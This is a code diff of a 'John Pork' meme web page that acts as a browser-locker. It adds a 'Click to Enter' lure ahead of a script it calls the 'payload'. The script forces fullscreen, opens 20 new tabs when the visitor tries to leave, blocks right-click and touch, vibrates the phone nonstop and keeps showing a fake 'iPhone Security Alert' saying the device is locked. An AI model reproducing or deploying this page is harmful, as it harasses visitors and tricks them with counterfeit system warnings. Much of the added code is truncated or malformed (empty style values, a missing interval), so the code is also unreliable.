@@ -1,10 +1,32 @@
-<!DOCTYPE html>
-<html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">    <title>John Pork</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>John Pork</title>
     <style>
-        body {
-            margin: 0;
+        /* Click-to-Enter Screen */        #clickScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            font-family: Arial, sans-serif;
+            z-index: 9999;
+            cursor: pointer;
+        }
+        #clickScreen h1 {
+            font-size: 36px;
+        }
+        #clickScreen p {
+            font-size: 20px;
+        }
+
+        /* Main Payload (Hidden Until Click) */
+        body {            margin: 0;
             padding: 0;
             overflow: hidden;
             background-color: black;
@@ -13,60 +35,68 @@
             left: 0;
             width: 100%;
             height: 100%;
-            cursor: none; /* Hide cursor */ touch-action: none; /* Disable touch gestures */
-        } img {
+            cursor: none;
+            touch-action: none;
+            display: none; /* Hidden by default */
+        }        img {
             position: absolute;
             top: 50%;
             left: 50%;
-            transform: translate(-50%, -50%);            width: 80%;
+            transform: translate(-50%, -50%);
+            width: 80%;
             max-width: 300px;
-        } #message {
+        }
+        #message {
             position: absolute;
-            bottom: 20px;
-            width: 100%;
-            text-align: center;
-            color: white;
-            font-family: Arial, sans-serif;
-            font-size: 24px;
-            text-shadow: 2px 2px 4px black;
+             bottom: 20px;
+             width: 100%;
+             text-align: center;
+             color:
+             font-family: Arial, sans-serif;
+             font-size: 24px;
+             text-shadow: 2px 2px 4px black;
         } </style>
 </head>
-<body>
-    <img src="https://th.bing.com/th/id/OIP.hGqGfvoqvtAkSImoB1ajEwHaNl?w=132&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="John Pork"> <div id="message">Hi, I'm John Pork!</div>
-    <audio id="audio" autoplay loop>
-        <source src="Jhonprok.mp3" type="audio/mpeg"> <!-- Replace with your audio -->
-    </audio>
-    <script>
-        // Force fullscreen (iOS Safari)        function enterFullscreen() {            const elem = document.documentElement;
-            if (elem.requestFullscreen) {                elem.requestFullscreen().catch(err => {});
-            } else if (elem.webkitRequestFullscreen) { /* Safari */                elem.webkitRequestFullscreen().catch(err => {});
-            } else if (elem.msRequestFullscreen) { /* IE11 */ elem.msRequestFullscreen().catch(err => {});            }
-        }        enterFullscreen();
-
-        // Spam new tabs if user tries to close
-        window.onbeforeunload = function() {
-            for (let i = 0; i < 20; i++) {
-                window.open(window.location.href, '_blank'); }
-            return "You can't leave!";        };        // Disable right-click, touch events, etc.
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('touchstart', e => e.preventDefault(), { passive: false }); // Fake iOS alert (tricks victims into thinking it's a system message)
-        function fakeAlert() {            const alert = document.createElement('div');            alert.style.position = 'fixed';
-            alert.style.top = '50%';
-            alert.style.left = '5%';
-            alert.style.width = '90%';
-            alert.style.backgroundColor = 'white';
-            alert.style.border = '1px solid #ccc';
-            alert.style.borderRadius = '15px';
-           alert.style.padding = '20px';
-           alert.style.boxShadow = '0 4px 8px rgba(0, ));';
-           alert.style.zIndex = '9999';
-           alert.style.textAlign = 'center';
-           alert.innerHTML = `               <h3>iPhone Security Alert</h3>
-               <p>Your device has been locked for security reasons.</p> <p>Tap "OK" to unlock.</p> <button onclick="this.parentElement.remove()">OK</button>
-           `;           document.body.appendChild(alert);       } setInterval(fakeAlert, 300); // Spam fake alerts
-
-       // Vibrate phone (if supported)
-       if (navigator.vibrate) {           setInterval(() => navigator.vibrate(1), 10); // Constant vibration
-       } </script>
+<body id="mainPayload"> <img src="https://th.bing.com/th/id/OIP.hGqGfvoqvtAkSImoB1ajEwHaNl?w=132&h=18&c=7&r=0&o=7&pid=1.7&rm=3" alt="John Pork"> <div id="message">Hi, I'm John Pork!</div>    <audio id="audio" loop>
+        <source src="Jhonprok.mp3" type="audio/mpeg">    </audio>
 </body>
+
+<!-- Click-to-Enter Screen (Visible by Default) -->
+<div id="clickScreen" onclick="startPayload()"> <h1>Click to Enter</h1>
+    <p>Tap anywhere to continue</p>
+</div>
+
+<script>
+    function startPayload() { // Hide click screen
+        document.getElementById('clickScreen').style.display = 'none';
+
+        // Show main payload
+        document.getElementById('mainPayload').style.display = 'block';
+
+        // Play audio (now allowed due to user interaction)
+        const audio = document.getElementById('audio');
+        audio.play().catch(e => console.log("Audio play failed:", e));
+
+        // Force fullscreen (iOS Safari)        function enterFullscreen() {            const elem = document.documentElement; if (elem.requestFullscreen) { elem.requestFullscreen().catch(err => {});            } else if (elem.webkitRequestFullscreen) { /* Safari */ elem.webkitRequestFullscreen().catch(err => {}); } else if (elem.msRequestFullscreen) { /* IE11 */ elem.msRequestFullscreen().catch(err => {}); } } enterFullscreen();        // Spam new tabs if user tries to close
+        window.onbeforeunload = function() { for (let i = 0; i < 20; i++) { window.open(window.location.href, '_blank'); } return "You can't leave!"; };
+
+        // Disable right-click, touch events, etc.
+       document.addEventListener('contextmenu', e => e.preventDefault());       document.addEventListener('touchstart', e => e.preventDefault(), { passive: false }); // Fake iOS alerts (spam every 3 seconds)
+       function fakeAlert() { const alert = document.createElement('div'); alert.style.position = 'fixed';
+           alert.style.top = '5%';
+           alert.style.left = '5%';
+           alert.style.width = '90%';
+           alert.style.backgroundColor = 'white';
+           alert.style.border = 'solid #ccc';
+           alert.style.borderRadius = 'px';
+           alert.style.padding = ';
+           alert.style.boxShadow = ';
+           alert.style.zIndex = ;
+           alert.style.textAlign = ';
+           alert.innerHTML = ` <h3>iPhone Security Alert</h3>
+               <p>Your device has been locked for security reasons.</p>
+               <p>Tap "OK" to unlock.</p> <button onclick="this.parentElement.remove()">OK</button>
+           `; document.body.appendChild(alert); } setInterval(fakeAlert, );       // Vibrate phone (if supported)       if (navigator.vibrate) { setInterval(() => navigator.vibrate(1), 10); // Constant vibration
+       }    }
+</script>
 </html>
